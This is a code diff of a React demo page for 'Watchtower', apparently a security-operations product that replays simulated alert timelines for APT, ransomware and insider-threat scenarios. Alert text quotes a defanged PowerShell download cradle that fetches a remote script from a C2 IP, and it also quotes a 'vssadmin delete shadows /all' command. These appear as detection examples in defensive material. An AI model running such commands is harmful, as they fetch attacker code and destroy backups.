@@ -1,174 +1,361 @@
 'use client';
-import { useState, useEffect, useCallback } from 'react';
+import { useState, useEffect, useRef } from 'react';
 
-const ATTACK = [
-  { id: 'a1', time: '09:14', title: 'Phishing email delivered — weaponised macro targeting finance team', sev: 'high', src: 'Proofpoint', device: 'MAIL-GW', user: 'jsmith@corp.local', mitre: 'T1566.001', verdict: 'tp', conf: 96, phase: 'Initial Access', analysis: 'Weaponised Office macro delivered to 12 recipients in finance. Sender domain darkcloud-svc.com registered 48 hours ago. Attachment hash matches known Emotet dropper on ThreatFox feed. DMARC/SPF failed.', evidence: ['Domain age <48h', 'Hash on ThreatFox IOC feed', '12 simultaneous targets', 'DMARC/SPF fail'], actions: ['Quarantine from all 12 mailboxes', 'Block sender domain at gateway', 'Check if any user opened attachment'] },
-  { id: 'a2', time: '09:22', title: 'Suspicious PowerShell — base64 encoded download cradle from outlook.exe', sev: 'high', src: 'CrowdStrike', device: 'WS042.corp.local', user: 'jsmith@corp.local', mitre: 'T1059.001', verdict: 'tp', conf: 94, phase: 'Execution', analysis: 'Base64-encoded PowerShell launched as child process of outlook.exe — classic phishing execution chain. Decoded payload: IEX(New-Object Net.WebClient).DownloadString(hxxp://185.220.101[.]42/stg2.ps1). This is NOT a scheduled task or admin script.', evidence: ['Parent process: outlook.exe', 'Base64 obfuscation = evasion intent', 'Download URL matches known C2 infra'], actions: ['Isolate WS042 immediately', 'Capture process tree + memory dump', 'Decode full payload for IOC extraction'] },
-  { id: 'a3', time: '09:25', title: 'Outbound C2 beacon to 185.220.101.42 — 60s interval (Cobalt Strike)', sev: 'critical', src: 'Taegis XDR', device: 'WS015.corp.local', user: 'mthompson@corp.local', mitre: 'T1071.001', verdict: 'tp', conf: 97, phase: 'Command & Control', analysis: 'Outbound HTTPS beacon every 60 seconds to 185.220.101.42 — textbook Cobalt Strike jitter pattern. This IP appears on 4 threat intel feeds (ThreatFox, URLhaus, CINS, Talos). Device WS015 has no legitimate reason to contact this IP. Second host compromised — indicates lateral spread.', evidence: ['IP on 4 threat feeds', '60s beacon = Cobalt Strike default', 'Second host compromised = spread confirmed'], actions: ['Isolate WS015', 'Block 185.220.101.42 at firewall + ZIA', 'Search proxy logs for all devices contacting this IP'] },
-  { id: 'a4', time: '09:31', title: 'LSASS memory access on domain controller — credential harvesting', sev: 'critical', src: 'Defender', device: 'SRV-DC01.corp.local', user: 'admin_svc', mitre: 'T1003.001', verdict: 'tp', conf: 98, phase: 'Credential Access', analysis: 'CRITICAL: LSASS memory access on a DOMAIN CONTROLLER using admin_svc — an account that ran PowerShell 8 minutes ago on a different host. This is Mimikatz or comsvcs.dll MiniDump. If credentials are extracted from DC01, the attacker has domain admin. This is the highest priority alert in this incident.', evidence: ['Domain controller targeted', 'admin_svc used across multiple hosts', 'T1003.001 = extremely high-fidelity detection'], actions: ['Emergency: rotate krbtgt password TWICE', 'Disable admin_svc immediately', 'Check for golden ticket creation'] },
-  { id: 'a5', time: '09:38', title: 'SMB lateral movement from compromised service account to file server', sev: 'high', src: 'Darktrace', device: 'FS01.corp.local', user: 'admin_svc', mitre: 'T1021.002', verdict: 'tp', conf: 89, phase: 'Lateral Movement', analysis: 'SMB lateral movement from admin_svc — the same account flagged in the LSASS dump. The attacker has pivoted from the compromised workstation to the file server. This is stage 4 of the kill chain: initial access, execution, credential access, and now lateral movement.', evidence: ['admin_svc already flagged in credential dump', 'SMB to file server follows expected progression', 'Same campaign — 4 correlated alerts in 24 minutes'], actions: ['Isolate FS01', 'Check for ransomware indicators', 'Audit SMB sessions in past hour'] },
-  { id: 'a6', time: '09:42', title: 'Kerberoasting — TGS tickets requested for 7 service accounts on DC', sev: 'critical', src: 'Sentinel', device: 'SRV-DC01.corp.local', user: 'admin_svc', mitre: 'T1558.003', verdict: 'tp', conf: 95, phase: 'Privilege Escalation', analysis: 'Kerberoasting on DC01 using the same admin_svc account. 7 TGS tickets requested in 3 seconds — offline cracking will follow. If they crack a service account with admin rights, they have persistent access even after password resets.', evidence: ['Follows LSASS dump by 11 minutes', 'admin_svc already confirmed compromised', '7 TGS tickets in 3s = automated tool'], actions: ['Force password rotation on ALL targeted service accounts', 'Enable AES256 only for Kerberos', 'Deploy honeypot service accounts'] },
-  { id: 'a7', time: '09:48', title: 'Anomalous 2.4GB outbound transfer — contractor account to unknown IP', sev: 'high', src: 'Taegis XDR', device: 'FS01.corp.local', user: 'contractor-ext', mitre: 'T1048', verdict: 'tp', conf: 91, phase: 'Exfiltration', analysis: 'Anomalous 2.4GB transfer from contractor-ext account — normal baseline is <50MB/day. Destination IP 91.215.85.7 is not a known business partner. Combined with the lateral movement to FS01 earlier, this is data staging and exfiltration from a compromised account.', evidence: ['Transfer volume 48x normal baseline', 'Contractor account = limited expected activity', 'Correlates with lateral movement chain'], actions: ['Block destination IP immediately', 'Disable contractor-ext account', 'Identify what files were transferred via DLP logs'] },
-  { id: 'a8', time: '09:52', title: 'Brute force authentication — 47 failed attempts on VPN gateway', sev: 'medium', src: 'Splunk', device: 'VPN-GW-01', user: 'multiple', mitre: 'T1110', verdict: 'suspicious', conf: 72, phase: 'Noise', analysis: '47 failed authentication attempts is above threshold, but the source IP 194.88.12.x is a known corporate VPN endpoint in Prague where your company has a satellite office. Could be a misconfigured service, a legitimate employee with a stuck password, or a genuine brute force. Need more context before escalating.', evidence: ['Source IP in country with company presence', 'No successful auth after failures', 'Pattern suggests automated tool, not manual'], actions: ['Monitor for 24 hours', 'Contact Prague office IT team', 'If unrecognised: block IP + force password reset'] },
-  { id: 'a9', time: '09:55', title: 'DNS tunnelling detected — high-entropy queries to dynamic DNS provider', sev: 'high', src: 'Zscaler ZIA', device: 'WS042.corp.local', user: 'jsmith@corp.local', mitre: 'T1572', verdict: 'tp', conf: 86, phase: 'Exfiltration', analysis: 'DNS query sizes averaging 180 bytes vs normal 40 bytes — data being encoded in DNS queries. Destination is a dynamic DNS provider commonly used by threat actors. This is a backup exfiltration channel on WS042, the initially compromised host. DNS tunnelling bypasses web proxy controls.', evidence: ['Query size 4.5x normal average', 'Dynamic DNS destination = suspicious infra', 'DNS tunnelling bypasses web proxy'], actions: ['Block the dynamic DNS domain at resolver', 'Capture DNS traffic from WS042', 'Check if this correlates with the C2 beacon on WS015'] },
+type SevKey = 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
+type VerdictKey = 'TP' | 'FP' | 'SUS';
+
+const SEV_COLOR: Record<SevKey, string> = { CRITICAL:'#f0405e', HIGH:'#f97316', MEDIUM:'#f0a030', LOW:'#4f8fff' };
+const VERDICT_COLOR: Record<VerdictKey, {c:string,bg:string}> = {
+  TP:{c:'#f0405e',bg:'#f0405e12'},
+  FP:{c:'#22d49a',bg:'#22d49a12'},
+  SUS:{c:'#f0a030',bg:'#f0a03012'},
+};
+
+const SCENARIOS = [
+  {
+    id:'apt',
+    title:'🎯 Multi-Stage APT Attack',
+    sub:'Spear-phish → Credential dump → Lateral movement → C2',
+    description:'A targeted spear-phishing campaign has breached your perimeter. Watch Watchtower detect the full kill chain across 8 security tools, correlate 9 alerts into a single attack narrative, and auto-respond — all in under 4 minutes.',
+    duration:9,
+    steps:[
+      { t:0.8, src:'Proofpoint', sev:'HIGH' as SevKey, title:'Spear-phish email — CFO impersonation', mitre:'T1566.001', device:'laptop-CFO01', verdict:'TP' as VerdictKey, conf:89, action:'Email quarantined, user notified', aiNote:'Sender domain registered 3 days ago. Payload matches Qakbot campaign IOCs.', phase:'Initial Access' },
+      { t:2.1, src:'Defender', sev:'CRITICAL' as SevKey, title:'Macro execution — suspicious child process', mitre:'T1059.003', device:'laptop-CFO01', verdict:'TP' as VerdictKey, conf:96, action:'Process killed, device isolated', aiNote:'cmd.exe spawned from WINWORD.EXE. Classic Office macro abuse. High confidence TP.', phase:'Execution' },
+      { t:3.0, src:'CrowdStrike', sev:'CRITICAL' as SevKey, title:'LSASS memory access — credential dump', mitre:'T1003.001', device:'laptop-CFO01', verdict:'TP' as VerdictKey, conf:98, action:'Incident INC-0847 opened, admin_svc disabled', aiNote:'Mimikatz-style LSASS access. Service account credentials at risk. Immediate escalation.', phase:'Credential Access' },
+      { t:4.2, src:'Taegis XDR', sev:'HIGH' as SevKey, title:'Lateral movement — admin_svc → SRV-FINANCE01', mitre:'T1021.002', device:'SRV-FINANCE01', verdict:'TP' as VerdictKey, conf:93, action:'Blocked SMB, account suspended', aiNote:'admin_svc authenticating to 4 hosts sequentially. Pattern matches worm-like spread.', phase:'Lateral Movement' },
+      { t:5.1, src:'Splunk', sev:'HIGH' as SevKey, title:'PowerShell encoded command — download cradle', mitre:'T1105', device:'SRV-FINANCE01', verdict:'TP' as VerdictKey, conf:91, action:'Script blocked, hash added to blocklist', aiNote:'Base64 encoded payload. Resolves to known C2 infrastructure: 185.220.101.42.', phase:'C2 Setup' },
+      { t:5.9, src:'Darktrace', sev:'CRITICAL' as SevKey, title:'Anomalous beaconing — 185.220.101.42:443', mitre:'T1071.001', device:'SRV-FINANCE01', verdict:'TP' as VerdictKey, conf:97, action:'IP blocked at perimeter, Zscaler policy updated', aiNote:'Darktrace: device behaviour deviation 98/100. C2 IP on ThreatFox, associated with LockBit.', phase:'C2 Active' },
+      { t:7.0, src:'Sentinel', sev:'HIGH' as SevKey, title:'Azure AD: impossible travel login — admin account', mitre:'T1078.004', device:'cloud-identity', verdict:'TP' as VerdictKey, conf:88, action:'Session revoked, MFA re-enrolled', aiNote:'Login from UK then Singapore within 11 minutes. Impossible travel. Credential confirmed compromised.', phase:'Persistence' },
+      { t:7.8, src:'Proofpoint', sev:'LOW' as SevKey, title:'Bulk email send from compromised account', mitre:'T1534', device:'cloud-email', verdict:'FP' as VerdictKey, conf:94, action:'Auto-closed — marketing campaign confirmed', aiNote:'Same user authorised bulk send for marketing. Cross-referenced Outlook calendar. FP.', phase:'Noise' },
+      { t:8.8, src:'Defender', sev:'MEDIUM' as SevKey, title:'Scheduled task persistence — SRV-FINANCE01', mitre:'T1053.005', device:'SRV-FINANCE01', verdict:'TP' as VerdictKey, conf:85, action:'Task removed, host re-imaged queued', aiNote:'Persistence mechanism installed post-compromise. Task runs at logon, downloads additional payload.', phase:'Persistence' },
+    ],
+  },
+  {
+    id:'ransomware',
+    title:'💀 Ransomware Pre-Cursor',
+    sub:'Detect and kill ransomware before encryption starts',
+    description:'Volume shadow copy deletion, rapid file enumeration, and a known ransomware binary — Watchtower identifies the pre-cursor pattern and isolates the host in 8 seconds, before a single file is encrypted.',
+    duration:7,
+    steps:[
+      { t:0.6, src:'CrowdStrike', sev:'HIGH' as SevKey, title:'vssadmin: shadow copy deletion attempt', mitre:'T1490', device:'SRV-FILES01', verdict:'TP' as VerdictKey, conf:95, action:'Process blocked, host flagged', aiNote:'Classic ransomware pre-cursor. vssadmin delete shadows /all executed.', phase:'Defense Evasion' },
+      { t:1.8, src:'Defender', sev:'CRITICAL' as SevKey, title:'Rapid file enumeration — 48k files in 3 seconds', mitre:'T1083', device:'SRV-FILES01', verdict:'TP' as VerdictKey, conf:99, action:'Host isolated — network cut', aiNote:'File traversal rate 16x baseline. Combined with shadow deletion: ransomware pre-encryption.', phase:'Impact' },
+      { t:3.1, src:'Splunk', sev:'CRITICAL' as SevKey, title:'Known ransomware hash — LockBit 3.0', mitre:'T1486', device:'SRV-FILES01', verdict:'TP' as VerdictKey, conf:99, action:'Binary quarantined, IR team paged', aiNote:'Hash matches LockBit 3.0 variant. No files encrypted. Host isolated at T+8s from first detection.', phase:'Impact' },
+      { t:4.5, src:'Taegis XDR', sev:'HIGH' as SevKey, title:'Same hash seen on 2 other hosts — spread detected', mitre:'T1210', device:'SRV-DB01, SRV-APP02', verdict:'TP' as VerdictKey, conf:92, action:'Both hosts isolated proactively', aiNote:'Lateral propagation via SMB. Watchtower proactively isolating all hosts with process lineage match.', phase:'Lateral Movement' },
+      { t:5.8, src:'Sentinel', sev:'MEDIUM' as SevKey, title:'Azure backup jobs running — potential target', mitre:'T1537', device:'cloud-backup', verdict:'SUS' as VerdictKey, conf:68, action:'Backup accounts locked, IR notified', aiNote:'Unusual backup access during active incident. Precautionary lock applied pending IR review.', phase:'Exfiltration Risk' },
+      { t:6.5, src:'Proofpoint', sev:'LOW' as SevKey, title:'External email alert — phishing link similar domain', mitre:'T1566', device:'all-users', verdict:'FP' as VerdictKey, conf:88, action:'Auto-closed — known pen test domain', aiNote:'Domain registered by internal red team. Confirmed FP via threat intel enrichment.', phase:'Noise' },
+    ],
+  },
+  {
+    id:'insider',
+    title:'👤 Insider Threat',
+    sub:'Detect data exfiltration before the employee leaves',
+    description:'A departing employee begins downloading 40GB of IP to personal cloud storage. Watchtower correlates HR data (resignation notice), DLP alerts, and anomalous access patterns to surface the risk in real time.',
+    duration:6,
+    steps:[
+      { t:0.9, src:'Zscaler', sev:'MEDIUM' as SevKey, title:'Abnormal upload volume — Google Drive 40GB', mitre:'T1567.002', device:'laptop-ENG05', verdict:'SUS' as VerdictKey, conf:74, action:'Upload throttled, HR notified', aiNote:'User ENG05 uploaded 40GB in 2 hours. Baseline is <500MB/day. Risk score elevated.', phase:'Exfiltration' },
+      { t:2.1, src:'Splunk', sev:'HIGH' as SevKey, title:'Source code repo access — non-working hours', mitre:'T1213', device:'laptop-ENG05', verdict:'TP' as VerdictKey, conf:88, action:'Access revoked, DLP policy enforced', aiNote:'02:14 AM repo clone of entire product codebase. User has 3-day notice period. HR record cross-referenced.', phase:'Collection' },
+      { t:3.4, src:'Defender', sev:'MEDIUM' as SevKey, title:'USB device connected — 128GB external drive', mitre:'T1052.001', device:'laptop-ENG05', verdict:'TP' as VerdictKey, conf:82, action:'USB blocked by policy, event logged', aiNote:'DLP policy triggered. USB write access denied. File access log captured.', phase:'Exfiltration' },
+      { t:4.6, src:'Sentinel', sev:'LOW' as SevKey, title:'CISA KEV lookup on company systems', mitre:'T1592', device:'laptop-ENG05', verdict:'SUS' as VerdictKey, conf:55, action:'Flagged for analyst review', aiNote:'Searching for vulnerabilities in own company infra. Combined with other signals: elevated risk.', phase:'Reconnaissance' },
+      { t:5.5, src:'Proofpoint', sev:'HIGH' as SevKey, title:'Bulk forward — inbox to personal Gmail', mitre:'T1114.003', device:'cloud-email', verdict:'TP' as VerdictKey, conf:93, action:'Forwarding rule deleted, account suspended', aiNote:'3,200 emails forwarded to personal account in last 48h. Matches exfiltration pattern.', phase:'Exfiltration' },
+    ],
+  },
 ];
 
-const sevC: Record<string, string> = { critical: '#f0405e', high: '#f0a030', medium: '#e8993a', low: '#3b8bff' };
-const verdC: Record<string, string> = { tp: '#f0405e', fp: '#22c992', suspicious: '#e8993a' };
+type Step = typeof SCENARIOS[0]['steps'][0];
 
-export default function Demo() {
-  const [step, setStep] = useState(0);
-  const [playing, setPlaying] = useState(false);
-  const [selAlert, setSelAlert] = useState<any>(null);
-  const [triaged, setTriaged] = useState(false);
-  const [posture, setPosture] = useState(82);
+export default function DemoPage() {
+  const [scenarioIdx, setScenarioIdx] = useState(0);
+  const [running, setRunning] = useState(false);
+  const [progress, setProgress] = useState(0);
+  const [steps, setSteps] = useState<Step[]>([]);
+  const [selectedStep, setSelectedStep] = useState<Step | null>(null);
+  const [activeView, setActiveView] = useState<'timeline'|'alert'>('timeline');
+  const [postureScore, setPostureScore] = useState(82);
+  const [toolsActive, setToolsActive] = useState<Set<string>>(new Set());
+  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const scenario = SCENARIOS[scenarioIdx];
+  const tpCount = steps.filter(s => s.verdict === 'TP').length;
+  const fpCount = steps.filter(s => s.verdict === 'FP').length;
 
-  useEffect(() => { if (!playing) return; if (step >= ATTACK.length) { setPlaying(false); setTimeout(() => setTriaged(true), 400); return; } const t = setTimeout(() => setStep(s => s + 1), 900); return () => clearTimeout(t); }, [playing, step]);
+  function reset() {
+    setRunning(false);
+    setProgress(0);
+    setSteps([]);
+    setSelectedStep(null);
+    setPostureScore(82);
+    setToolsActive(new Set());
+    if (intervalRef.current) clearInterval(intervalRef.current);
+  }
 
-  // Posture degrades as alerts come in
-  useEffect(() => { const degraded = Math.max(34, 82 - step * 5.5); setPosture(Math.round(degraded)); }, [step]);
+  function startSim() {
+    reset();
+    const sc = SCENARIOS[scenarioIdx];
+    const totalMs = sc.duration * 1000;
+    const startTime = Date.now();
+    setRunning(true);
+    const addedSteps = new Set<number>();
 
-  const visible = ATTACK.slice(0, step);
-  const tpCount = visible.filter(a => a.verdict === 'tp').length;
-  const susCount = visible.filter(a => a.verdict === 'suspicious').length;
-  const critCount = visible.filter(a => a.sev === 'critical').length;
-  const toolsActive = [...new Set(visible.map(a => a.src))].length;
-  const postureGrade = posture >= 80 ? 'A' : posture >= 70 ? 'B' : posture >= 55 ? 'C' : posture >= 40 ? 'D' : 'F';
-  const postureCol = posture >= 70 ? '#22c992' : posture >= 50 ? '#f0a030' : '#f0405e';
+    intervalRef.current = setInterval(() => {
+      const elapsed = (Date.now() - startTime) / 1000;
+      const pct = Math.min((elapsed / sc.duration) * 100, 100);
+      setProgress(pct);
 
-  const startReplay = useCallback(() => { setStep(0); setTriaged(false); setSelAlert(null); setPlaying(true); }, []);
+      sc.steps.forEach((step, i) => {
+        if (!addedSteps.has(i) && elapsed >= step.t) {
+          addedSteps.add(i);
+          setSteps(prev => [...prev, step]);
+          setToolsActive(prev => new Set([...prev, step.src]));
+          if (step.verdict === 'TP') setPostureScore(prev => Math.max(prev - 4, 44));
+        }
+      });
 
-  return (<><style dangerouslySetInnerHTML={{ __html: CSS }} /><div className="dm">
-    <div className="dm-banner">🎯 Live simulation of a multi-stage APT attack — watch AI detect, correlate, and respond in real-time<a href="/signup"> Start free trial →</a></div>
+      if (elapsed >= sc.duration) {
+        clearInterval(intervalRef.current!);
+        setRunning(false);
+        setProgress(100);
+      }
+    }, 100);
+  }
 
-    <div className="dm-top"><div className="dm-logo"><div className="dm-li">W</div><span>Watch</span>tower</div><div className="dm-live" /><span className="dm-env">DEMO ENVIRONMENT</span><a href="/signup" className="dm-cta">Start Free Trial →</a></div>
+  useEffect(() => { return () => { if (intervalRef.current) clearInterval(intervalRef.current); }; }, []);
 
-    <div className="dm-cols">
-      <div className="dm-left">
-        <div className="dm-scenario"><div className="dm-scenario-hd">🎯 Operation Midnight — Multi-Stage APT Simulation</div><p>09:14 — A targeted spear-phishing campaign has breached your perimeter. Watch Watchtower detect the full kill chain across 8 security tools, correlate 9 alerts into a single attack narrative, and auto-respond — all without human intervention.</p>{!playing && step === 0 && <button className="dm-play" onClick={startReplay}>▶ Start Attack Simulation</button>}{!playing && step > 0 && <button className="dm-play" onClick={startReplay}>↻ Replay Simulation</button>}{playing && <div className="dm-progress"><div className="dm-pbar"><div style={{ width: (step / ATTACK.length * 100) + '%' }} /></div><span>{step}/{ATTACK.length} alerts ingested</span></div>}</div>
+  const scoreColor = postureScore >= 75 ? '#22d49a' : postureScore >= 55 ? '#f0a030' : '#f0405e';
+  const scoreGrade = postureScore >= 80 ? 'A' : postureScore >= 65 ? 'B' : postureScore >= 50 ? 'C' : 'D';
+  const circumference = 2 * Math.PI * 42;
+  const dashArray = `${(postureScore / 100) * circumference} ${circumference}`;
+  const TOOLS_LIST = ['Proofpoint','CrowdStrike','Taegis XDR','Defender','Darktrace','Sentinel','Splunk','Zscaler'];
 
-        <div className="dm-timeline">{visible.map((a, i) => (<div key={a.id} className={'dm-tl-item' + (i === visible.length - 1 && playing ? ' new' : '') + (selAlert?.id === a.id ? ' selected' : '')} onClick={() => setSelAlert(a)}>
-          <div className="dm-tl-left"><div className="dm-tl-time">{a.time}</div><div className="dm-tl-dot" style={{ background: sevC[a.sev], boxShadow: '0 0 8px ' + sevC[a.sev] }} />{i < visible.length - 1 && <div className="dm-tl-line" />}</div>
-          <div className="dm-tl-body">
-            <div className="dm-tl-phase-row"><span className="dm-tl-phase">{a.phase}</span>{triaged && <span className="dm-verdict" style={{ color: verdC[a.verdict] }}>{a.verdict === 'tp' ? 'TP' : a.verdict === 'fp' ? 'FP' : 'SUS'} {a.conf}%</span>}</div>
-            <div className="dm-tl-title">{a.title}</div>
-            <div className="dm-tl-meta"><span className="dm-src">{a.src}</span><span className="dm-mitre">{a.mitre}</span><span className="dm-device">{a.device}</span></div>
-          </div>
-        </div>))}{visible.length === 0 && <div className="dm-tl-empty"><div style={{fontSize:'2rem',marginBottom:8}}>🏰</div>Press "Start Attack Simulation" to watch Watchtower handle a live APT campaign</div>}</div>
+  return (
+    <div style={{ minHeight:'100vh', display:'flex', flexDirection:'column', background:'#050508', color:'#e6ecf8', fontFamily:'Inter,sans-serif', fontSize:14 }}>
+      <style>{`
+        *{margin:0;padding:0;box-sizing:border-box}
+        @keyframes slideIn{from{opacity:0;transform:translateX(-14px)}to{opacity:1;transform:translateX(0)}}
+        @keyframes flash{0%{background:#4f8fff15}100%{background:transparent}}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
+        .step-new{animation:slideIn 0.35s ease,flash 0.7s ease}
+        .sev-bar{width:4px;border-radius:2px;flex-shrink:0}
+      `}</style>
 
-        {triaged && <div className="dm-result"><div className="dm-result-hd">🤖 Watchtower Auto-Response Complete — 3.2 seconds</div><div className="dm-result-grid"><div className="dm-result-item"><div className="dm-ri-val" style={{ color: '#f0405e' }}>{tpCount}</div><div className="dm-ri-label">True Positives</div></div><div className="dm-result-item"><div className="dm-ri-val" style={{ color: '#e8993a' }}>{susCount}</div><div className="dm-ri-label">Needs Review</div></div><div className="dm-result-item"><div className="dm-ri-val" style={{ color: '#22c992' }}>6</div><div className="dm-ri-label">Auto-Actions</div></div><div className="dm-result-item"><div className="dm-ri-val" style={{ color: '#3b8bff' }}>42 min</div><div className="dm-ri-label">Saved vs Manual</div></div></div><div className="dm-result-actions"><div className="dm-ra"><span className="dm-ra-icon">🚨</span>Escalated to Incident #INC-2024-0847 with full attack chain timeline</div><div className="dm-ra"><span className="dm-ra-icon">🔒</span>Isolated WS042 + WS015 via Taegis XDR endpoint isolation API</div><div className="dm-ra"><span className="dm-ra-icon">👤</span>Disabled admin_svc and contractor-ext accounts in Active Directory</div><div className="dm-ra"><span className="dm-ra-icon">🚫</span>Blocked 185.220.101.42 + 91.215.85.7 at perimeter firewall</div><div className="dm-ra"><span className="dm-ra-icon">💬</span>Notified #soc-alerts Slack channel with incident summary</div><div className="dm-ra"><span className="dm-ra-icon">📋</span>Generated 14-step response runbook with forensic collection steps</div></div></div>}
+      {/* BANNER */}
+      <div style={{ textAlign:'center', padding:'7px 16px', background:'#3b8bff08', borderBottom:'1px solid #3b8bff15', fontSize:'0.74rem', color:'#50607a' }}>
+        🎯 Interactive product walkthrough — select an attack scenario and press Play
+        <a href='/signup' style={{ color:'#4f8fff', fontWeight:700, marginLeft:8 }}>Start free trial →</a>
       </div>
 
-      <div className="dm-right">
-        {/* Posture gauge */}
-        <div className="dm-card"><div className="dm-card-hd">🛡 Security Posture</div><div className="dm-posture"><div className="dm-posture-ring"><svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="42" fill="none" stroke="#141820" strokeWidth="6" /><circle cx="50" cy="50" r="42" fill="none" stroke={postureCol} strokeWidth="6" strokeDasharray={`${posture * 2.64} 264`} strokeLinecap="round" transform="rotate(-90 50 50)" style={{transition:'stroke-dasharray .8s ease,stroke .5s'}} /></svg><div className="dm-posture-val" style={{color:postureCol}}>{posture}</div><div className="dm-posture-grade" style={{color:postureCol}}>{postureGrade}</div></div><div className="dm-posture-label">{step === 0 ? 'Healthy' : triaged ? 'Under Attack — Contained' : 'Degrading...'}</div></div></div>
+      {/* TOP BAR */}
+      <div style={{ display:'flex', alignItems:'center', padding:'10px 20px', borderBottom:'1px solid #141820', gap:12 }}>
+        <a href='/' style={{ display:'flex', alignItems:'center', gap:6, fontWeight:900, fontSize:'0.95rem', marginRight:'auto', textDecoration:'none', color:'#e6ecf8' }}>
+          <div style={{ width:24,height:24,borderRadius:6,background:'linear-gradient(135deg,#4f8fff,#8b6fff)',display:'flex',alignItems:'center',justifyContent:'center',fontSize:'0.6rem',color:'#fff',fontWeight:900 }}>W</div>
+          <span style={{ color:'#4f8fff' }}>Watch</span>tower
+        </a>
+        <span style={{ width:6,height:6,borderRadius:'50%',background:'#22c992',boxShadow:'0 0 6px #22c992',animation:'pulse 2s ease infinite',display:'block' }} />
+        <span style={{ fontSize:'0.6rem', fontWeight:700, padding:'3px 10px', borderRadius:4, background:'#f0a03018', color:'#f0a030', border:'1px solid #f0a03028', letterSpacing:'0.5px' }}>DEMO ENVIRONMENT</span>
+        <a href='/signup' style={{ padding:'7px 18px', borderRadius:8, background:'#4f8fff', color:'#fff', fontSize:'0.78rem', fontWeight:700, textDecoration:'none', transition:'all .15s' }}>Start Free Trial →</a>
+      </div>
 
-        <div className="dm-card"><div className="dm-card-hd">📊 Live Metrics</div><div className="dm-stats"><div className="dm-stat"><div className="dm-stat-v">{visible.length}</div><div className="dm-stat-l">Alerts</div></div><div className="dm-stat"><div className="dm-stat-v" style={{ color: '#f0405e' }}>{critCount}</div><div className="dm-stat-l">Critical</div></div><div className="dm-stat"><div className="dm-stat-v" style={{color:'#22c992'}}>{toolsActive}</div><div className="dm-stat-l">Sources</div></div><div className="dm-stat"><div className="dm-stat-v" style={{color:triaged?'#22c992':'#f0a030'}}>{triaged?'3.2s':'—'}</div><div className="dm-stat-l">Triage Time</div></div></div></div>
+      {/* SCENARIO PICKER */}
+      <div style={{ display:'flex', gap:8, padding:'12px 20px', borderBottom:'1px solid #141820', background:'#080a12', overflowX:'auto' }}>
+        {SCENARIOS.map((sc,i) => (
+          <button key={sc.id} onClick={() => { setScenarioIdx(i); reset(); }}
+            style={{ padding:'8px 16px', borderRadius:9, border:`1px solid ${i===scenarioIdx ? '#4f8fff50' : '#1e2536'}`, background: i===scenarioIdx ? '#4f8fff12' : 'transparent', color: i===scenarioIdx ? '#e6ecf8' : '#50607a', fontWeight: i===scenarioIdx ? 700 : 500, fontSize:'0.78rem', cursor:'pointer', whiteSpace:'nowrap', transition:'all .15s', fontFamily:'Inter,sans-serif' }}>
+            {sc.title}
+          </button>
+        ))}
+      </div>
 
-        <div className="dm-card"><div className="dm-card-hd">🔌 Tool Detection Status</div><div className="dm-tools-list">{['Proofpoint', 'CrowdStrike', 'Taegis XDR', 'Defender', 'Darktrace', 'Sentinel', 'Splunk', 'Zscaler ZIA'].map(t => { const active = visible.some(a => a.src === t); const count = visible.filter(a => a.src === t).length; return <div key={t} className={'dm-tool-item' + (active ? ' active' : '')}><div className={'dm-tool-dot' + (active ? ' on' : '')} /><span>{t}</span>{active && <span className="dm-tool-count">{count}</span>}</div>; })}</div></div>
+      {/* MAIN */}
+      <div style={{ display:'grid', gridTemplateColumns:'1fr 320px', flex:1, overflow:'hidden' }}>
 
-        {/* AI analysis panel */}
-        {selAlert && <div className="dm-card dm-detail"><div className="dm-card-hd">🤖 AI Triage Analysis<button onClick={() => setSelAlert(null)} className="dm-close">✕</button></div><div className="dm-detail-sev"><span className="dm-detail-sev-badge" style={{background:sevC[selAlert.sev]}}>{selAlert.sev}</span><span className="dm-mitre">{selAlert.mitre}</span><span className="dm-device">{selAlert.device}</span></div><div className="dm-detail-title">{selAlert.title}</div>{triaged ? <><div className="dm-verdict-big" style={{ color: verdC[selAlert.verdict] }}>{selAlert.verdict === 'tp' ? 'TRUE POSITIVE' : selAlert.verdict === 'suspicious' ? 'SUSPICIOUS' : 'FALSE POSITIVE'} — {selAlert.conf}% confidence</div><div className="dm-detail-analysis">{selAlert.analysis}</div><div className="dm-detail-section">Evidence</div><div className="dm-detail-evidence">{selAlert.evidence.map((e: string, i: number) => <div key={i} className="dm-ev-item">{e}</div>)}</div><div className="dm-detail-section">Recommended Actions</div><div className="dm-detail-actions">{selAlert.actions.map((a: string, i: number) => <div key={i} className="dm-act-item"><span className="dm-act-num">{i + 1}</span>{a}</div>)}</div></> : <div className="dm-detail-pending">Triage pending — complete the simulation to see AI analysis</div>}<div className="dm-detail-cta"><a href="/signup" className="dm-cta" style={{ fontSize: '.72rem', width: '100%', display: 'block', textAlign: 'center' }}>Get this for every alert — Start Free Trial →</a></div></div>}
+        {/* LEFT — Timeline */}
+        <div style={{ padding:'16px 20px', overflow:'auto', borderRight:'1px solid #141820' }}>
 
-        {!selAlert && <div className="dm-card"><div className="dm-card-hd">💡 What You're Seeing</div><div className="dm-explainer">{step === 0 ? 'This demo simulates a real APT attack unfolding across your security stack. 9 alerts from 8 different tools, correlated into one attack narrative. Click "Start" to begin.' : !triaged ? 'Alerts flowing from multiple tools as the attack progresses through the MITRE ATT&CK kill chain. Click any alert to inspect it. Watch the posture score degrade in real-time.' : 'All 9 alerts triaged in 3.2 seconds. 8 confirmed true positives from a single campaign. Devices isolated, accounts disabled, IPs blocked, incident created with a 14-step runbook. A human analyst would take 45+ minutes. Click any alert for the full AI reasoning.'}</div></div>}
+          {/* Scenario Header */}
+          <div style={{ padding:'18px 20px', background:'linear-gradient(145deg,#0a0d14,#0f1219)', border:'1px solid #141820', borderRadius:12, marginBottom:14 }}>
+            <div style={{ fontSize:'0.92rem', fontWeight:800, marginBottom:5 }}>{scenario.title}</div>
+            <div style={{ fontSize:'0.72rem', color:'#50607a', marginBottom:4 }}>{scenario.sub}</div>
+            <p style={{ fontSize:'0.74rem', color:'#8a9ab8', lineHeight:1.65, marginBottom:14 }}>{scenario.description}</p>
+
+            {!running && progress === 0 && (
+              <button onClick={startSim} style={{ padding:'10px 28px', borderRadius:10, background:'linear-gradient(135deg,#4f8fff,#7c6aff)', color:'#fff', fontSize:'0.88rem', fontWeight:700, border:'none', cursor:'pointer', fontFamily:'Inter,sans-serif', boxShadow:'0 4px 20px rgba(79,143,255,0.3)' }}>
